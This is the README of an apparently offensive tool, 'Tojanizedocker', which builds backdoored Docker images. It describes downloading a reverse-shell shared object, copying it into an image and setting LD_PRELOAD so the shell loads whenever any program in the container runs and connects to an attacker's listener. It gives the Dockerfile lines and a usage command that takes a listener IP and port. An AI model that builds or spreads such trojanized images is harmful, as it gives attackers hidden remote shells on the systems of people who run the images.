# Tojanizedocker

# Docker Backdoor Image Creator

This Python script automates the process of creating a backdoored Docker image by downloading a specified reverse shell binary, embedding it into a Docker image, and setting up environment variables to facilitate a reverse shell connection.
[Dockerscan - Reverse shell](https://github.com/cr0hn/dockerscan/blob/590a844418038d25e6649e609ef630868e0c9161/dockerscan/actions/image/modifiers/shells/reverse_shell.so)

## How It Works

The script performs several key operations to create a backdoored Docker image:

1. **Download Reverse Shell Binary**: It downloads a reverse shell shared object file (`.so`) from a specified URL. This file is designed to establish a remote connection from the Docker container to an attacker-controlled server.

2. **Create Dockerfile**: The script dynamically generates a Dockerfile that incorporates the downloaded reverse shell. This Dockerfile instructs Docker to copy the reverse shell into the image and set it to be loaded before any other library by using the `LD_PRELOAD` environment variable.

## Understanding LD_PRELOAD and Reverse Shell Injection

- The Dockerfile created by this script contains the following critical lines:

```
COPY reverse_shell.so /usr/share/lib/reverse_shell.so
ENV LD_PRELOAD=/usr/share/lib/reverse_shell.so
```
## What Does This Do?

- `COPY reverse_shell.so /usr/share/lib/reverse_shell.so`: Command copies the reverse shell binary (reverse_shell.so - used in dockerscan) into a specific location inside the Docker image. 

- `ENV LD_PRELOAD`=/usr/share/lib/reverse_shell.so: By setting the LD_PRELOAD environment variable, it is intructed that the Linux dynamic linker to load our specified `reverse_shell.so` file before any other libraries when a program is run. This is a powerful method for modifying the behavior of compiled applications transparently.

- Use LD_PRELOAD leading to immediate code execution: Using `LD_PRELOAD` with a constructor attribute in the shared object allows executing custom code before the main application starts. This can be used for debugging, monitoring, or altering the application's normal operation without modifying the source code.

  
## Requirements

Before running the script, ensure that Docker is installed and running on your system. Python 3.x is also required.

## Installation

Install the required Python libraries with:

```
pip install -r requirements.txt
```

## Usage

```
python docker_backdoor.py -i <base-image> -o <output-image> -l <listener-ip> -p <listener-port> --shell-url <url-to-reverse-shell>
```

## Credits [Based On]

- **Backdooring Docker images - Reverse shell**: [Backdooring Docker images - Reverse shell](https://greencashew.dev/posts/backdooring-docker-images-reverse-shell/)
- **DockerScan GitHub Repository**: [Source for DockerScan, a tool for security analysis of Docker containers](https://github.com/cr0hn/dockerscan/)
- **LD_PRELOAD: How to Run Code at Load Time**: [LD_PRELOAD: How to Run Code at Load Time](https://www.secureideas.com/blog/2021/ldpreload-runcode.html)
- Thanks to #chatgpt
